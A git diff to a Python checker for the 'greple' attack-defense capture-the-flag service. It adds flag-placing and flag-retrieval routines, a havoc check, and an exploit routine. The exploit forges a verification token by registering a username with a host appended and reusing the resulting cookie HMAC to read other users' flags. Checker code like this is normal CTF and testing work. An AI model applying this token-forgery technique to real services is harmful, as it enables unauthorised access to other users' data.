@@ -1,10 +1,11 @@
 """Checker for greple service."""
 
+import asyncio
 import logging
 import random
 import re
 from html import unescape
-from urllib.parse import quote, unquote, urlencode
+from urllib.parse import parse_qs, quote, unquote, urlencode
 
 import fastapi
 import httpx
@@ -37,6 +38,7 @@ from utils import (
     set_safe_search,
     shorten_url,
     submit_page,
+    token,
     verify_netloc,
 )
 
@@ -51,6 +53,35 @@ def _client(client: httpx.AsyncClient, logger: logging.LoggerAdapter) -> Client:
 
 
 @_CHECKER.putflag(0)
+async def _putflag_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
+    username = username_noise(128)
+    await register_user(client, username)
+
+    assert client.base_url.port is not None
+    port = client.base_url.port - random.randint(1, 7)
+
+    url = client.base_url.copy_with(port=port, path=f"/{quote(task.flag, safe='')}")
+    await submit_page(client, False, str(url))
+
+    await db.set("cookie", client.cookies["user_account"])
+
+    return str(port)
+
+
+@_CHECKER.getflag(0)
+async def _getflag_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
+    try:
+        cookie = await db.get("cookie")
+    except KeyError as e:
+        raise MumbleException("Missing putflag data in DB") from e
+
+    client.cookies["user_account"] = cookie
+
+    res = await get_search_console(client)
+    assert_in(task.flag, unquote(unescape(res.text)), "Submitted URL not in table")
+
+
+@_CHECKER.putflag(1)
 async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
     username = username_noise(128)
     await register_user(client, username)
@@ -66,7 +97,7 @@ async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db:
     return username
 
 
-@_CHECKER.getflag(0)
+@_CHECKER.getflag(1)
 async def _getflag_short_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
     try:
         username = await db.get("username")
@@ -97,34 +128,6 @@ async def _getflag_short_url(task: GetflagCheckerTaskMessage, client: Client, db
 
     url = await get_short_url(client, short_url_search[0])
     assert_in(task.flag, unquote(url), "Flag missing from URL")
-
-
-# @_CHECKER.putflag(1)
-async def _putflag_api_key(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
-    username = username_noise(128)
-    await register_user(client, username)
-
-    paste_url = await paste(client, word_noise(16), word_noise(16))
-    await submit_page(client, True, str(paste_url))
-
-    await verify_netloc(client, client.base_url.netloc.decode(), task.flag)
-
-    await db.set("cookie", client.cookies["user_account"])
-
-    return username
-
-
-# @_CHECKER.getflag(1)
-async def _getflag_api_key(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
-    try:
-        cookie = await db.get("cookie")
-    except KeyError as e:
-        raise MumbleException("Missing putflag data in DB") from e
-
-    client.cookies["user_account"] = cookie
-
-    res = await get_search_console(client)
-    assert_in(task.flag, unescape(res.text), "API key not found")
 
 
 @_CHECKER.putnoise(0)
@@ -181,7 +184,71 @@ async def _cron(client: Client) -> None:
     await client.get("/cron")
 
 
+@_CHECKER.havoc(1)
+async def _verify_netloc(client: Client) -> None:
+    assert client.base_url.port is not None
+    port = client.base_url.port + 1
+
+    username = username_noise(128)
+    await register_user(client, username)
+    url = str(client.base_url.copy_with(port=port, path="/path"))
+    await submit_page(client, False, url)
+
+    await register_user(client, username_noise(128))
+
+    netloc = client.base_url.copy_with(port=port).netloc.decode()
+    netloc_hash = await verify_netloc(client, netloc, "")
+
+    done = set()
+
+    while True:
+        resp = await client.get(client.base_url.copy_with(port=port, path="/"))
+        assert_status(resp, 200)
+
+        for match in re.finditer("token=([0-9a-f]{56})", unescape(resp.text)):
+            if match[1] in done:
+                continue
+            done.add(match[1])
+
+            try:
+                body = await token(client, netloc_hash, match[1])
+            except MumbleException as e:
+                if str(e) == "Unexpected HTTP status code":
+                    continue
+                raise
+
+            assert_in(url, unescape(body), "Failed to find entries for verified netloc")
+            assert_in(username, unescape(body), "Failed to find entries for verified netloc")
+            return
+
+        await asyncio.sleep(0.5)
+
+
 @_CHECKER.exploit(0)
+async def _exploit_hmac(client: Client, task: ExploitCheckerTaskMessage) -> str:
+    if task.attack_info is None:
+        raise MumbleException("Missing attack info")
+    try:
+        port = int(task.attack_info)
+    except ValueError as e:
+        raise MumbleException("Invalid attack info") from e
+
+    netloc = client.base_url.copy_with(port=port).netloc.decode()
+    username = username_noise(128)
+
+    await register_user(client, f"{username}{netloc}")
+    hmac = parse_qs(client.cookies["user_account"])["hmac"][0]
+
+    await register_user(client, username)
+
+    netloc_hash = await verify_netloc(client, netloc, "")
+
+    body = await token(client, netloc_hash, hmac)
+
+    return "\n".join(m[0] for m in re.finditer(task.flag_regex, unquote(unescape(body))))
+
+
+@_CHECKER.exploit(1)
 async def _exploit_sca(
     logger: logging.LoggerAdapter,
     client: Client,
